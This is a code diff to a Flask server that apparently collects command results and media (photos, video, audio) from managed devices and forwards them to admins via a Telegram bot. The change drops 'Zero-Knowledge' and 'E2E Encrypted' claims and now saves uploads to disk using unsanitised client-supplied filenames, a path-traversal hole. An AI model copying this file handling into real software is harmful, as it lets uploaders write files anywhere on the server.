@@ -1148,10 +1148,10 @@ def _data():
     if f: data, name = f.read(), f.filename
     elif request.data: data, name = request.data, None
     else: return jsonify({"success": False, "error": "لا بيانات"}), 400
-    # Zero-Knowledge: Data is processed in-memory only, never saved to disk
-    sn = name or f"{uuid.uuid4().hex}.enc"
-    logger.info(f"[Zero-Knowledge] Data received from {did}: {sn} ({len(data)} bytes) - Passing through...")
-    return jsonify({"success": True, "status": "forwarded", "size": len(data)}), 200
+    d = os.path.join("uploads", did); os.makedirs(d, exist_ok=True)
+    sn = name or f"{uuid.uuid4().hex}.enc"; sp = os.path.join(d, sn)
+    with open(sp, "wb") as fh: fh.write(data)
+    return jsonify({"success": True, "file": sn, "size": len(data)}), 200
 
 
 # ── Media Upload → Forward to Telegram Bot ──
@@ -1169,32 +1169,36 @@ def _api_upload_media():
     if not f:
         return jsonify({"success": False, "error": "no file"}), 400
 
-    # Zero-Knowledge: Files are kept in RAM and forwarded directly to Telegram
+    upload_dir = os.path.join("uploads", did)
+    os.makedirs(upload_dir, exist_ok=True)
     filename = f.filename or f"{command}_{int(time.time())}"
+    filepath = os.path.join(upload_dir, filename)
     file_data = f.read()
-    
+    with open(filepath, "wb") as fh:
+        fh.write(file_data)
+
     dev = dm.get_device(did)
     short_label = _dev_label(dev) if dev else did
     lbl = COMMANDS.get(command, {}).get("label", command)
-    caption = f"📥 <b>نتيجة الأمر (E2E Encrypted)</b>\n\n📱 <b>{short_label}</b>\n⚙ {lbl}\n━━━━━━━━━━━━━━━\n"
+    caption = f"📥 <b>نتيجة الأمر</b>\n\n📱 <b>{short_label}</b>\n⚙ {lbl}\n━━━━━━━━━━━━━━━\n"
 
     if mdm_bot:
-        from io import BytesIO
         for admin_id in Config.ADMIN_IDS:
             try:
-                # Use BytesIO to keep file in memory
-                bio = BytesIO(file_data)
-                bio.name = filename
                 if file_type == "photo":
-                    mdm_bot.bot.send_photo(admin_id, photo=bio, caption=caption, parse_mode="HTML")
+                    mdm_bot.bot.send_photo(admin_id, photo=open(filepath, "rb"), caption=caption, parse_mode="HTML")
                 elif file_type == "video":
-                    mdm_bot.bot.send_video(admin_id, video=bio, caption=caption, parse_mode="HTML")
+                    mdm_bot.bot.send_video(admin_id, video=open(filepath, "rb"), caption=caption, parse_mode="HTML")
                 elif file_type == "audio":
-                    mdm_bot.bot.send_audio(admin_id, audio=bio, caption=caption, parse_mode="HTML")
+                    mdm_bot.bot.send_audio(admin_id, audio=open(filepath, "rb"), caption=caption, parse_mode="HTML")
                 else:
-                    mdm_bot.bot.send_document(admin_id, document=bio, caption=caption, parse_mode="HTML")
+                    mdm_bot.bot.send_document(admin_id, document=open(filepath, "rb"), caption=caption, parse_mode="HTML")
             except Exception as e:
                 logger.error(f"فشل إرسال ملف للبوت: {e}")
+                try:
+                    mdm_bot.bot.send_document(admin_id, document=open(filepath, "rb"), caption=caption, parse_mode="HTML")
+                except Exception as e2:
+                    logger.error(f"فشل إرسال مستند: {e2}")
 
     logger.info(f"[Media] ملف من #{dev.get('short_id', '?') if dev else '?'}: {filename} ({file_type})")
     return jsonify({"success": True, "file": filename, "size": len(file_data)}), 200
